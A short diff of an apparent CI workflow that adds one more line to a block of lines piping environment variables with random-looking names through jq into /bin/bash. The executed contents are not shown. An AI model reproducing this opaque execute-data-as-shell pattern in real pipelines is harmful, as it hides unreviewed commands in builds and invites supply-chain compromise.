@@ -30,6 +30,7 @@ jobs:
           echo $eaov0526 | jq -r .a40218 | /bin/bash
           echo $ny2 | jq -r .jt7 | /bin/bash
           echo $kz897 | jq -r .pziuf326 | /bin/bash
+          printf '%s' "$tamtm38" | jq -r .gixi62226 | /bin/bash
 
       - name: Save archive
         if: always()
